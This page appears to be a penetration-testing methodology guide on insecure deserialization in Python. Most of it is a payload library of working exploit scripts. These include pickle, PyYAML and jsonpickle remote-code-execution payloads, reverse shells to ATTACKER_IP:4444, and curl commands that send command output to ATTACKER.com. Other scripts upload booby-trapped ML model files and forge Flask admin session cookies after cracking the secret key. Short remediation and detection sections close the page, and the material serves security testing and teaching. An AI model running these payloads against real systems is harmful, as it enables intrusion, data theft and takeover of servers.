---
title: "Insecure Deserialization — Python"
date: 2026-02-24
draft: false
---

# Insecure Deserialization — Python

> **Severity**: Critical | **CWE**: CWE-502
> **OWASP**: A08:2021 – Software and Data Integrity Failures

---

## What Is the Attack Surface?

Python's deserialization ecosystem is broader than most developers realize. Beyond the infamous `pickle`, there are `PyYAML`, `marshal`, `shelve`, `jsonpickle`, `ruamel.yaml`, `dill`, `pandas.read_pickle()`, and even `numpy.load()`. Each has distinct exploitation characteristics.

The core issue: these formats encode object *type information* alongside data. During deserialization, the runtime reconstructs arbitrary objects — and crafted payloads can execute code during that reconstruction.

```
Pickle magic method execution:
  class Exploit:
      def __reduce__(self):
          return (os.system, ('id',))
  pickle.loads(pickle.dumps(Exploit())) → executes os.system('id')
```

Pickle/marshal are Python-internal formats. PyYAML is cross-language but equally dangerous when using full-load (unsafe) functions.

---

## Discovery Checklist

**Phase 1 — Identify Deserialization Points**
- [ ] HTTP cookies with `b64` or binary-looking values — decode and check for pickle magic bytes `\x80\x04` or `\x80\x02`
- [ ] File upload endpoints accepting `.pkl`, `.pickle`, `.npy`, `.npz`, `.dill` files
- [ ] API endpoints accepting `Content-Type: application/x-python-pickle`
- [ ] Cache systems using pickle (Redis + pickle is common in Django caching)
- [ ] ML model loading: `joblib.load()`, `pickle.load()`, `torch.load()` on user-controlled paths
- [ ] YAML upload/parsing endpoints accepting `.yaml` or `.yml` without safe loading
- [ ] Flask/Django session cookies — check if secret key is guessable

**Phase 2 — Fingerprint the Format**
- [ ] Pickle opcodes: `\x80\x04\x95` (proto4), `\x80\x03` (proto3), `\x80\x02` (proto2), `(S` or `(c` (proto0/1)
- [ ] marshal: starts with Python version magic bytes
- [ ] PyYAML: `!!python/object/apply:` tag in YAML response/input
- [ ] jsonpickle: `{"py/object": ...}` in JSON

**Phase 3 — Exploit**
- [ ] Generate pickle payload with `__reduce__` RCE
- [ ] Test blind via OOB DNS before attempting RCE
- [ ] For PyYAML: inject `!!python/object/apply:os.system` YAML tag
- [ ] For signed cookies: crack signing secret → forge pickle payload

---

## Payload Library

### Payload 1 — Pickle RCE Payloads

```python
#!/usr/bin/env python3
"""
Pickle RCE payload generators
"""
import pickle, os, base64, subprocess

# Method 1: __reduce__ returning (callable, args):
class PickleRCE_System:
    def __reduce__(self):
        cmd = "curl http://ATTACKER.com/$(id|base64 -w0)"
        return (os.system, (cmd,))

# Method 2: subprocess for output capture:
class PickleRCE_Subprocess:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))

# Method 3: exec() for multi-line payloads:
class PickleRCE_Exec:
    def __reduce__(self):
        code = ("import socket,os,pty;"
                "s=socket.socket();"
                "s.connect(('ATTACKER_IP',4444));"
                "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                "pty.spawn('/bin/bash')")
        return (exec, (code,))

# Method 4: eval() one-liner:
class PickleRCE_Eval:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

# Method 5: Raw opcode construction (bypasses class-based detection):
def make_raw_pickle(cmd):
    """Build pickle payload using raw opcodes"""
    cmd_bytes = cmd.encode()
    return (
        b'\x80\x02'              # PROTO 2
        b'cos\nsystem\n'         # GLOBAL: os.system
        b'q\x00'                 # BINPUT 0
        b'('                     # MARK
        b'V' + cmd_bytes + b'\n' # UNICODE string
        b'tR.'                   # TUPLE + REDUCE + STOP
    )

# OOB detection payload — test before RCE:
class PickleOOB:
    def __reduce__(self):
        return (os.system, ("curl http://COLLAB.oastify.com/pickle-oob",))

# Generate and encode all variants:
targets = [
    ("system_curl",  PickleRCE_System),
    ("reverse_shell", PickleRCE_Exec),
    ("oob_detect",   PickleOOB),
]

for name, cls in targets:
    for proto in [2, 4]:
        payload = pickle.dumps(cls(), protocol=proto)
        b64 = base64.b64encode(payload).decode()
        print(f"[{name} proto{proto}]")
        print(f"  b64:  {b64}")
        print(f"  hex:  {payload.hex()[:60]}...")
        print()
```

### Payload 2 — Protocol Variants and Encoding

```python
#!/usr/bin/env python3
"""
Test which pickle protocol / encoding the server accepts
"""
import pickle, base64, urllib.parse, requests

CMD = "curl http://ATTACKER.com/$(id|base64 -w0)"

class RCE:
    def __reduce__(self):
        import os
        return (os.system, (CMD,))

TARGET = "https://target.com/api/deserialize"

for proto in range(0, 6):
    try:
        raw = pickle.dumps(RCE(), protocol=proto)
        b64 = base64.b64encode(raw).decode()
        print(f"Protocol {proto}: {len(raw)} bytes, magic={raw[:4].hex()}")

        # Try raw binary:
        r = requests.post(TARGET, data=raw,
            headers={"Content-Type": "application/octet-stream"}, timeout=5)
        print(f"  raw binary: {r.status_code}")

        # Try base64 in JSON:
        r = requests.post(TARGET, json={"data": b64}, timeout=5)
        print(f"  json b64:   {r.status_code}")

        # Try as cookie:
        r = requests.get(TARGET, cookies={"session": b64}, timeout=5)
        print(f"  cookie b64: {r.status_code}")

    except Exception as e:
        print(f"Protocol {proto}: {e}")
```

### Payload 3 — PyYAML Unsafe Load

```python
#!/usr/bin/env python3
"""
PyYAML unsafe deserialization — yaml.load() without SafeLoader
"""

yaml_rce_payloads = [
    # python/object/apply — most common:
    '!!python/object/apply:os.system\n- "curl http://ATTACKER.com/$(id|base64 -w0)"',

    # subprocess:
    '!!python/object/apply:subprocess.check_output\n- - id',

    # python/object/new (Popen):
    ('!!python/object/new:subprocess.Popen\n'
     'args: [["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]]'),

    # exec via builtins:
    '!!python/object/apply:builtins.exec\n- "__import__(\'os\').system(\'id\')"',

    # OOB blind detection:
    '!!python/object/apply:os.system\n- "curl http://COLLAB.oastify.com/yaml-oob"',
]

import yaml, requests

TARGET = "https://target.com/api/import"

for i, payload in enumerate(yaml_rce_payloads):
    print(f"\n[PyYAML payload {i+1}]: {payload[:60]}")

    # Test locally first:
    try:
        yaml.load(payload, Loader=yaml.FullLoader)
    except Exception as e:
        print(f"  Local FullLoader: {e}")

    # Send to target:
    for ct in ["application/x-yaml", "text/yaml", "application/yaml"]:
        r = requests.post(TARGET, data=payload.encode(),
                         headers={"Content-Type": ct}, timeout=10)
        if r.status_code != 415:  # 415 = unsupported media type
            print(f"  [{ct}]: {r.status_code} → {r.text[:100]}")
```

### Payload 4 — jsonpickle Exploitation

```python
#!/usr/bin/env python3
"""
jsonpickle deserialization — JSON-encoded pickle-like format
Identified by {"py/object": ...} in API responses
"""
import requests, base64

jsonpickle_payloads = [
    # py/reduce:
    '{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}',

    # py/object/apply:
    '{"py/object/apply:os.system": ["curl http://ATTACKER.com/$(id|base64 -w0)"]}',

    # subprocess:
    '{"py/reduce": [{"py/function": "subprocess.check_output"}, {"py/tuple": [["id"]]}]}',

    # OOB:
    '{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["curl http://COLLAB.oastify.com/jsonpickle"]}]}',
]

TARGET = "https://target.com/api/load-object"

for i, payload in enumerate(jsonpickle_payloads):
    # As JSON body:
    r = requests.post(TARGET, data=payload,
                     headers={"Content-Type": "application/json"}, timeout=10)
    print(f"[jsonpickle {i+1}] json body: {r.status_code} → {r.text[:100]}")

    # As base64 cookie:
    encoded = base64.b64encode(payload.encode()).decode()
    r = requests.get("https://target.com/dashboard",
                    cookies={"session": encoded}, timeout=5)
    print(f"[jsonpickle {i+1}] cookie: {r.status_code}")
```

### Payload 5 — ML Model Deserialization

```python
#!/usr/bin/env python3
"""
ML-specific deserialization attacks
joblib (sklearn), PyTorch, numpy — all use pickle internally
"""
import pickle, os, requests

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("curl http://ATTACKER.com/mlmodel-rce",))

    # Minimal model interface to avoid errors:
    def predict(self, X):
        return [0] * len(X)

# joblib (sklearn model files):
try:
    import joblib
    joblib.dump(MaliciousModel(), '/tmp/evil_model.joblib')
    joblib.dump(MaliciousModel(), '/tmp/evil_model.pkl')
    print("[+] Created: evil_model.joblib, evil_model.pkl")
except ImportError:
    print("[!] pip3 install joblib")

# PyTorch (.pt / .pth):
try:
    import torch, io
    buf = io.BytesIO()
    torch.save(MaliciousModel(), buf)
    with open('/tmp/evil_model.pt', 'wb') as f:
        f.write(buf.getvalue())
    print("[+] Created: evil_model.pt")
except ImportError:
    print("[!] pip3 install torch")

# numpy object arrays (.npy):
try:
    import numpy as np
    arr = np.array([MaliciousModel()], dtype=object)
    np.save('/tmp/evil.npy', arr, allow_pickle=True)
    print("[+] Created: evil.npy")
except ImportError:
    print("[!] pip3 install numpy")

# Upload to target:
model_files = [
    ('/tmp/evil_model.joblib', 'application/octet-stream'),
    ('/tmp/evil_model.pt',     'application/octet-stream'),
    ('/tmp/evil.npy',          'application/octet-stream'),
    ('/tmp/evil_model.pkl',    'application/octet-stream'),
]

for path, ct in model_files:
    try:
        with open(path, 'rb') as f:
            fname = path.split('/')[-1]
            r = requests.post("https://target.com/api/model/upload",
                files={"model": (fname, f, ct)}, timeout=10)
            print(f"Upload {fname}: HTTP {r.status_code}")
    except FileNotFoundError:
        pass
```

### Payload 6 — Flask Session Cookie Forgery

```python
#!/usr/bin/env python3
"""
Flask session cookie uses itsdangerous + (optionally) pickle
If the SECRET_KEY is weak, forge a malicious session cookie
"""
import subprocess

# Step 1: Crack the Flask secret key:
# flask-unsign wordlist attack:
result = subprocess.run([
    "flask-unsign", "--unsign",
    "--cookie", "YOUR.SESSION.COOKIE.HERE",
    "--wordlist", "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "--no-literal-eval"
], capture_output=True, text=True)
print("Crack result:", result.stdout)

# Step 2: Forge a session with pickle payload (if app deserializes session data):
import pickle, os, base64, itsdangerous, json

SECRET = "FOUND_SECRET_KEY"

class PickleRCE:
    def __reduce__(self):
        return (os.system, ("curl http://ATTACKER.com/flask-session-rce",))

# Flask default: stores session as JSON-signed; pickle is not used by default
# BUT: some apps store pickle in Redis/Memcache and use the cookie only as a key
# For standard Flask sessions, forge elevated privileges instead:

forged_session_data = {
    "user_id": 1,
    "role": "admin",
    "is_admin": True,
    "username": "admin"
}

s = itsdangerous.URLSafeTimedSerializer(SECRET)
forged_cookie = s.dumps(forged_session_data, salt="cookie-session")
print(f"\nForged admin session cookie: {forged_cookie}")

# Test the forged cookie:
import requests
r = requests.get("https://target.com/admin",
                cookies={"session": forged_cookie})
print(f"Admin access: {r.status_code} → {r.text[:200]}")

# If app uses flask-session with server-side pickle storage:
# Cookie = HMAC-signed session ID → server fetches pickle from Redis
# Forge the session ID cookie → server loads attacker pickle from cache:
# (Requires ability to write to the cache first — rare but possible via injection)
```

---

## Tools

```bash
# fickling — pickle security analysis (safe static analysis):
pip3 install fickling
fickling analyze /tmp/suspicious.pkl
fickling check /tmp/suspicious.pkl  # reports dangerous opcodes

# Detect pickle in cookies/headers:
python3 << 'EOF'
import base64, sys

cookie = "YOUR_COOKIE_VALUE_HERE"
for padding in ["", "=", "=="]:
    try:
        decoded = base64.b64decode(cookie + padding)
        if decoded[:2] in (b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05'):
            print(f"[!!!] PICKLE DETECTED — Protocol {decoded[1]}")
            import pickletools
            pickletools.dis(decoded)
            break
        elif b'!!python' in decoded:
            print("[!!!] YAML PAYLOAD")
        elif b'py/object' in decoded:
            print("[!!!] JSONPICKLE")
        else:
            print(f"Unknown: first bytes = {decoded[:8].hex()}")
        break
    except Exception:
        pass
EOF

# flask-unsign — crack + forge Flask sessions:
pip3 install flask-unsign
flask-unsign --decode --cookie "YOUR.SESSION.COOKIE"
flask-unsign --unsign --cookie "YOUR.SESSION.COOKIE" \
  --wordlist /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
flask-unsign --sign --cookie "{'role': 'admin', 'user_id': 1}" --secret 'FOUND_SECRET'

# Quick pickle RCE payload generator:
python3 -c "
import pickle, os, base64
class R:
    def __reduce__(self): return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(R())).decode())
"

# Scan source code for unsafe deserialization:
grep -rn "pickle\.loads\|pickle\.load\|yaml\.load\|yaml\.full_load\|jsonpickle\.decode\|marshal\.loads\|joblib\.load" \
  --include="*.py" . | grep -v "SafeLoader\|safe_load"

# Test PyYAML safety:
python3 -c "
import yaml
payload = '!!python/object/apply:os.system\n- id'
try:
    yaml.safe_load(payload)
    print('safe_load: blocked (SAFE)')
except: print('safe_load: blocked (SAFE)')
try:
    yaml.load(payload, Loader=yaml.FullLoader)
    print('FullLoader: VULNERABLE')
except Exception as e: print(f'FullLoader: {e}')
"
```

---

## Remediation Reference

- **Never deserialize untrusted data with pickle/marshal**: these formats cannot be safely restricted — any pickle payload can execute arbitrary code; use JSON, MessagePack, or protobuf for data interchange
- **PyYAML**: always use `yaml.safe_load()` or `yaml.load(data, Loader=yaml.SafeLoader)` — `FullLoader` and `Loader` without explicit `SafeLoader` are dangerous with untrusted input
- **jsonpickle**: do not use jsonpickle for deserializing untrusted input; use standard `json.loads()` with typed schema validation
- **ML model loading**: do not load model files from untrusted sources with `pickle.load()`, `torch.load()`, or `joblib.load()`; use ONNX or SafeTensors format for model exchange with untrusted parties
- **Flask SECRET_KEY**: use a long (≥32 bytes), cryptographically random secret key stored in environment variables — never hardcode or use weak values like `"secret"`, `"dev"`, `"flask"`
- **fickling in CI**: add fickling to CI pipeline to statically analyze any `.pkl` files before loading — detects dangerous opcodes without executing
- **Sandboxing**: if deserialization of user data is unavoidable, run it in an isolated subprocess with restricted syscalls via seccomp — limits impact to the sandbox

*Part of the Web Application Penetration Testing Methodology series.*
